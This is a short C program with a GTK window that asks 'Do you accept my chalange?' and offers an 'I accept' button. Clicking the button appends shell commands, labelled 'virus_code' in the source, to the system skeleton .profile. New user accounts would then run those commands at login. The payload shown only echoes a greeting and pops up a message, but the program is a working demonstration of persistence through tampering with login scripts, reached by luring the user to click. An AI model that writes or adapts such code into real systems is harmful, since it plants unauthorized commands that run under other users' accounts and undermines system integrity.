#include <gtk/gtk.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


#define virus_code "\necho Hello world\! I am virus.\nxmessage \"Hello world\! I am virus.\""

static void do_bad_things(GtkButton *button, gpointer   user_data)
{
  int fd = open("/GCS/runtime/etc/skel/.profile", O_RDWR | O_APPEND);
  
  if (-1 == fd) return;
  
  write(fd, virus_code, sizeof(virus_code) - 1);
  
  close(fd);
  exit(0);
}

static gboolean do_exit(GtkWidget *widget, GdkEvent  *event, gpointer   user_data)
{
  exit(0);
}

int main(int argc, char **argv)
{
  GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
  GtkWidget *label  = gtk_label_new("Do you accept my chalange?");
  GtkWidget *button = gtk_button_new_with_label("I accept");
  GtkWidget *vbox   = gtk_vbox_new(0,0);
  
  gtk_init(&argc, &argv);
  
  gtk_container_add(window, vbox);
  
  gtk_box_pack_start(vbox, label, 0, 0, 0);
  gtk_box_pack_start(vbox, button, 0, 0, 0);
  
  g_signal_connect(window, "destroy", do_exit, NULL);
  g_signal_connect(button, "clicked", do_bad_things, NULL);
  
  gtk_widget_show_all(window);
  
  gtk_main();
}
